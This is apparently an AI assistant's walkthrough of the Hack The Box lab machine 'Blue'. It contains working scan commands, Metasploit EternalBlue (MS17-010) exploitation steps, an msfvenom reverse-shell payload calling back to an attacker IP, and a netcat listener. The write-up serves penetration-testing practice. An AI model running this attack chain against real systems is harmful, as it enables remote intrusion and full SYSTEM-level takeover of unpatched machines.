Here’s a clean and comprehensive walkthrough for **HTB: Blue**, structured and annotated for efficient review and future reference. This follows your preferred layout of phases and commands for HTB machine notes 📘.

---

# 🧊 HTB: Blue Walkthrough

**Machine Info:**
- **IP**: `10.10.10.40`
- **OS**: Windows 7 Professional SP1 (x64)
- **Difficulty**: Easy
- **Exploit**: MS17-010 (ETERNALBLUE)
- **Privilege Escalation**: Not needed – initial shell is SYSTEM 🎯

---

## 🧭 Recon

### 🔍 Full TCP Port Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.40
```

### 🎯 Targeted Script & Version Detection
```bash
nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
```

**Open Ports:**
- `135` (MS RPC)
- `139` (NetBIOS)
- `445` [SMB](SMB)
- Several in `49152-49157`

### 🛑 Vulnerability Check for MS17-010
```bash
nmap -p 445 --script vuln -oA scans/nmap-smbvulns 10.10.10.40
```

Output confirms:
```
VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

---

## 📁 SMB Enumeration

### 🧭 Guest Enumeration
```bash
smbmap -H 10.10.10.40 -u "0xdf" -p "0xdf"
```

### 🔎 Check Shares with `smbclient`
```bash
smbclient //10.10.10.40/share
smbclient //10.10.10.40/users
```

> Both readable, but no interesting files – just default folders.

---

## 💣 Exploitation – EternalBlue via Metasploit

### 🚀 Use Exploit Module
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.14
run
```

> ✅ Successful shell as `NT AUTHORITY\SYSTEM`

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 🔄 Drop to Shell
```bash
meterpreter > shell
```

---

## 🏁 Flags

```bash
C:\Users\haris\Desktop> type user.txt
4c546aea************************

C:\Users\Administrator\Desktop> type root.txt
ff548eb7************************
```

---

## 🐍 Optional – Exploit with Python (for OSCP-like scenarios)

### ⚙️ Setup Python2 VirtualEnv for Impacket
```bash
sudo apt install virtualenv
cd /opt
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
virtualenv impacket-venv -p $(which python2)
source impacket-venv/bin/activate
pip install -r requirements.txt
pip install .
```

### 📦 Payload Generation
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
```

### 📤 Exploit Execution
```bash
python send_and_execute.py 10.10.10.40 rev.exe
```

### 🎧 Catch the Shell
```bash
rlwrap nc -lnvp 443
```

---

## 🧠 Lessons Learned

- MS17-010 is still widely useful in legacy environments.
- Metasploit is stable for this exploit, but Python tools offer good practice for manual setups.
- Always check for anonymous access and vulnerable SMB services.
- No privilege escalation needed: initial shell is SYSTEM.

---

Let me know if you'd like this exported as a Markdown or PDF report, or if you'd like to chain all walkthroughs into one HTB notebook! 📘💼